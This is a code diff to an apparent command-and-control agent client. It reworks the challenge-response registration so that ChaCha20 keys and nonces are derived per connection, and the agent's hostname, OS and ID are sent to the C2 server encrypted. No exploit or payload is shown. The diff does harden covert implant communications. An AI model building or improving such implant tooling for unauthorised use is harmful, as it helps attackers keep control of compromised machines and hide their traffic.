@@ -18,7 +18,7 @@ import socket
 import time
 from typing import Callable, Optional
 
-from common.crypto import NONCE_AGENT_TO_C2, NONCE_C2_TO_AGENT, ChaCha20, EncryptedStream, derive_key
+from common.crypto import DIR_AGENT_TO_C2, DIR_C2_TO_AGENT, ChaCha20, EncryptedStream, derive_material
 from common.protocol import (
     CMD_HEARTBEAT,
     CMD_REGISTER,
@@ -95,14 +95,13 @@ class AgentClient:
         self._reader = PacketReader()
         if self._on_packet is not None and hasattr(self._on_packet, "reset"):
             self._on_packet.reset()
-        # Derive the ChaCha20 key before the handshake: after the challenge is
-        # verified, the (now encrypted) register_confirm is the first packet of
-        # the Agent -> C2 encrypted stream, so tx must be shared between the
-        # confirm and all subsequent Agent -> C2 traffic.
-        key = derive_key(self._auth_token)
-        tx = ChaCha20(key, NONCE_AGENT_TO_C2)
-        rx = ChaCha20(key, NONCE_C2_TO_AGENT)
-        if not await self._handshake(reader, writer, tx):
+        # The ChaCha20 key+nonce are derived inside _handshake from the fresh
+        # per-connection nonce: after the challenge is verified, the (now
+        # encrypted) register_confirm is the first packet of the Agent -> C2
+        # encrypted stream, so the same tx must cover the confirm and all
+        # subsequent Agent -> C2 traffic.
+        ok, tx, rx = await self._handshake(reader, writer)
+        if not ok:
             logger.warning("registration handshake failed")
             writer.close()
             return
@@ -137,7 +136,7 @@ class AgentClient:
                 self._hb_task = None
             writer.close()
 
-    async def _handshake(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, tx: ChaCha20) -> bool:
+    async def _handshake(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         """Challenge-response registration with the C2.
 
         Sends a ``register`` packet carrying ONLY a random nonce (no agent id /
@@ -145,10 +144,12 @@ class AgentClient:
         Receives the C2's ``sha256(nonce + c2_auth_tokens)`` challenge, verifies
         it against the locally stored token, and only after verification sends
         ``register_confirm`` now carrying the identity fields
-        (agent_id, hostname, os). The confirm packet is ENCRYPTED with ``tx``
-        (the first packet of the Agent -> C2 ChaCha20 stream), so the identity
-        never travels in plaintext. Returns False (and disconnects) on any
-        verification failure.
+        (agent_id, hostname, os). The confirm packet is ENCRYPTED with the tx
+        cipher derived from this connection's nonce (the first packet of the
+        Agent -> C2 ChaCha20 stream), so the identity never travels in plaintext.
+
+        Returns ``(False, None, None)`` on any verification failure; on success
+        returns ``(True, tx, rx)`` where tx/rx are the per-connection ciphers.
         """
         nonce = secrets.token_hex(16)
         req_id = self.next_request_id()
@@ -159,12 +160,17 @@ class AgentClient:
 
         expected = await self._receive_register_response(reader)
         if expected is None:
-            return False
+            return False, None, None
 
         local = hashlib.sha256((nonce + self._auth_token).encode("utf-8")).hexdigest()
         if not hmac.compare_digest(local, expected):
             logger.warning("auth verification failed (token mismatch)")
-            return False
+            return False, None, None
+
+        tx_key, tx_nonce = derive_material(self._auth_token, nonce, DIR_AGENT_TO_C2)
+        rx_key, rx_nonce = derive_material(self._auth_token, nonce, DIR_C2_TO_AGENT)
+        tx = ChaCha20(tx_key, tx_nonce)
+        rx = ChaCha20(rx_key, rx_nonce)
 
         hostname = socket.gethostname()
         os_name = _detect_os()
@@ -175,7 +181,7 @@ class AgentClient:
         async with self._write_lock:
             writer.write(tx.crypt(pkt))
             await writer.drain()
-        return True
+        return True, tx, rx
 
     async def _receive_register_response(self, reader: asyncio.StreamReader) -> Optional[str]:
         """Wait for the C2's register_response (challenge hash)."""
